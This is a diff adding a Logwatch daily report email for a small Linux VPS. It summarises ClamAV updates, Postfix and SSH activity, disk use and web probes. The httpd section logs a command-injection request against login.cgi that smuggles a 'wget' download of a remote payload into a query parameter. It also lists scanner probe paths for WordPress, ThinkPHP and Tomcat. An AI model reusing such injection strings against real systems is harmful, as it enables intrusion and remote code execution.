@@ -1,0 +1,137 @@
+Return-Path: <root@hrankiety.pl>
+Delivered-To: postmaster@hrankiety.pl
+Received: by hrankiety.pl (Postfix, from userid 0)
+	id D78649F2166E; Mon, 23 Dec 2019 03:20:11 +0100 (CET)
+To: postmaster@hrankiety.pl
+From: postmaster@hrankiety.pl
+Subject: Logwatch for 2626.serwervps.pl (Linux)
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Type: text/plain; charset="iso-8859-1"
+Message-Id: <20191223022011.D78649F2166E@hrankiety.pl>
+Date: Mon, 23 Dec 2019 03:20:06 +0100 (CET)
+
+
+ ################### Logwatch 7.3.6 (05/19/07) #################### 
+        Processing Initiated: Mon Dec 23 03:20:05 2019
+        Date Range Processed: yesterday
+                              ( 2019-Dec-22 )
+                              Period is day.
+      Detail Level of Output: 0
+              Type of Output: unformatted
+           Logfiles for Host: 2626.serwervps.pl
+  ################################################################## 
+ 
+ --------------------- clam-update Begin ------------------------ 
+
+ Last ClamAV update process started at Sun Dec 22 03:33:11 2019
+ 
+ Last Status:
+    WARNING: Your ClamAV installation is OUTDATED!
+    WARNING: Local version: 0.100.3 Recommended version: 0.102.1
+    DON'T PANIC! Read https://www.clamav.net/documents/upgrading-clamav
+    main.cld is up to date (version: 59, sigs: 4564902, f-level: 60, builder: sigmgr)
+    Downloading daily-25670.cdiff [100%]
+    daily.cld updated (version: 25670, sigs: 2073357, f-level: 63, builder: raynman)
+    Can't query daily.25670.93.1.0.6810DA54.ping.clamav.net
+    bytecode.cld is up to date (version: 331, sigs: 94, f-level: 63, builder: anvilleg)
+    Database updated (6638353 signatures) from db.local.clamav.net (IP: 104.16.218.84)
+ 
+ ---------------------- clam-update End ------------------------- 
+
+ 
+ --------------------- httpd Begin ------------------------ 
+
+ 
+ A total of 2 sites probed the server 
+    185.156.177.234
+    5.101.64.77
+ 
+ Requests with error response codes
+    400 Bad Request
+       /login.cgi?cli=aa%20aa%27;wget%20http://18 ... h%20/tmp/kh%27$: 1 Time(s)
+       null: 3 Time(s)
+    404 Not Found
+       /.git/HEAD: 3 Time(s)
+       /2019/wp-login.php: 1 Time(s)
+       /TP/html/public/index.php: 1 Time(s)
+       /TP/index.php: 2 Time(s)
+       /TP/public/index.php: 2 Time(s)
+       /blog/wp-login.php: 1 Time(s)
+       /editBlackAndWhiteList: 2 Time(s)
+       /elrekt.php: 1 Time(s)
+       /html/public/index.php: 1 Time(s)
+       /index.php: 1 Time(s)
+       /manager/html: 1 Time(s)
+       /public/index.php: 1 Time(s)
+       /test/wp-login.php: 1 Time(s)
+       /thinkphp/html/public/index.php: 2 Time(s)
+       /wordpress/wp-login.php: 1 Time(s)
+       /wp-login.php: 2 Time(s)
+       /wp/wp-login.php: 1 Time(s)
+ 
+ ---------------------- httpd End ------------------------- 
+
+ 
+ --------------------- Postfix Begin ------------------------ 
+
+       84   *Warning: Pre-queue content-filter connection overload 
+    11369   SASL authentication failed 
+       52   Miscellaneous warnings 
+ 
+  711.129K  Bytes accepted                           728,196
+  702.568K  Bytes delivered                          719,430
+ ========   ================================================
+ 
+       28   Accepted                                  90.32%
+        3   Rejected                                   9.68%
+ --------   ------------------------------------------------
+       31   Total                                    100.00%
+ ========   ================================================
+ 
+        3   Reject HELO/EHLO                         100.00%
+ --------   ------------------------------------------------
+        3   Total Rejects                            100.00%
+ ========   ================================================
+ 
+    12635   Connections made      
+    12636   Disconnections        
+       28   Removed from queue    
+       24   Delivered             
+        4   Bounce (remote)       
+        2   DSNs undeliverable    
+ 
+        1   SMTP protocol violations 
+ 
+ 
+ 
+ ---------------------- Postfix End ------------------------- 
+
+ 
+ --------------------- SSHD Begin ------------------------ 
+
+ 
+ Users logging in through sshd:
+    btertil:
+       185.17.41.230 (backup): 2 times
+ 
+ 
+ Received disconnect:
+    11: disconnected by user : 2 Time(s)
+ 
+ ---------------------- SSHD End ------------------------- 
+
+ 
+ --------------------- Disk Space Begin ------------------------ 
+
+ Filesystem      Size  Used Avail Use% Mounted on
+ /dev/simfs       50G   23G   28G  45% /
+ none            1.0G  4.0K  1.0G   1% /dev
+ 
+ 
+ ---------------------- Disk Space End ------------------------- 
+
+ 
+ ###################### Logwatch End ######################### 
+
+ 
